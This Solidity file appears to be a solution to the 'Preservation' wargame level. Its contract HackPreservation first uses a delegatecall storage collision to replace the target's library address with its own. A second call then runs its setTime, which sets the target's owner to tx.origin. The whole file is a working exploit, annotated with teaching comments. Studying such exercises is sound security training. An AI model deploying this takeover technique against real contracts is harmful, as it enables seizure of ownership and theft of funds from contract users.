// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "./Preservation.sol";

// 🟢 Good practice when defining libraries:
// 📖 https://docs.soliditylang.org/en/v0.8.17/contracts.html#libraries
// library HackPreservation {
contract HackPreservation {
    // 🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳
    // 🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳CONTEXT🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳
    // 🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳
    // public library contracts
    address public timeZone1Library; // index 0
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));
    // 🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳🔳

    Preservation preservation;

    // 🔴 All the variables that you add here do not exist
    // in the Preservation.sol context when doing the delegatedcall
    address public anotherVariable;

    constructor(address _preservationAddress) {
        preservation = Preservation(_preservationAddress);
    }

    /// @dev Hack the ownership of Preservation.sol
    function setTime(uint256 _time) public {
        owner = tx.origin; // given authority to this contract
    }

    // 📖 https://docs.soliditylang.org/en/v0.8.17/introduction-to-smart-contracts.html?highlight=delegatecall#delegatecall-and-librarie
    /// @dev Replace the LibraryContract.sol in Preservation.sol for HackLibaryContract.sol
    function hackLibrary() public {
        // Replace index 0 with our Library
        // Here we are calling LibraryContract.sol through Preservation.sol
        preservation.setFirstTime(uint256(uint160(address(this))));
    }

    function hackPreservation() public {
        // Now we claim the ownership of the contract
        // Here we are calling HackPreservation.sol through Preservation.sol
        uint256 anyNumber = 0;
        preservation.setFirstTime(anyNumber);
    }
}
